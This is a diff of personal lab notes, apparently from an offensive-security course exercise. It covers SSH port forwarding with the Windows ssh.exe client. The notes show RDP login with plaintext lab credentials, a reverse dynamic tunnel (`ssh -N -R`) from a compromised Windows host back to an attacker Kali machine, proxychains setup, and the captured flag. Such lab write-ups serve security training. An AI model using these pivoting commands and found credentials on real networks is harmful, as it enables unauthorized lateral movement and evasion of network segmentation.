@@ -664,3 +664,43 @@ proxychains ./ssh_remote_dynamic_client -i 10.4.228.64 -p 9062
 
 ## sshuttle
 
+(see mats)
+
+## ssh.exe
+
+1. Log in to MULTISERVER03 with the _rdp_admin_ credentials we found in the Confluence database (**rdp_admin:P@ssw0rd!**). Enumerate which port forwarding techniques are available, then use the Windows OpenSSH client to create a port forward that allows you to reach port 4141 on PGDATABASE01 from your Kali machine.
+
+Download the **ssh_exe_exercise_client.bin** binary from **http://MULTISERVER03/umbraco/ssh_exe_exercise_client.bin** to your Kali machine, and run it against port 4141 on PGDATABASE01, through the port forward you create. Once a successful connection is made, the client will print the flag it gets from the server.
+
+- Start SSH on Kali
+```bash
+sudo systemctl start ssh
+```
+
+- RDP into MULTISERVER03, download file, and start SSH Tunnel
+```bash
+xfreerdp /cert-ignore /compression /auto-reconnect /u:rdp_admin /p:P@ssw0rd! /v:192.168.216.64 /w:1600 /h:800 /drive:test,/home/kali/exercises/forward_tunnel
+
+# In cmd prompt in Win
+ssh -N -R 4141 kali@192.168.45.204
+```
+
+- In Kali, check **proxychain4.conf** and exploit
+```bash
+sudo vim /etc/proxychain4.conf
+	...
+	[ProxyList]
+	# add proxy here ...
+	# meanwile
+	# defaults set to "tor"
+	# socks4        127.0.0.1 9050
+	socks5 127.0.0.1 4141
+
+proxychains ./ssh_exe_exercise_client.bin -i 10.4.216.215
+	[proxychains] config file found: /etc/proxychains4.conf
+	[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+	[proxychains] DLL init: proxychains-ng 4.17
+	Connecting to 10.4.216.215:4141
+	[proxychains] Strict chain  ...  127.0.0.1:4141  ...  10.4.216.215:4141  ...  OK
+	Flag: "OS{623936b5c7f4bcf0dbf156e7c3f42073}"
+```
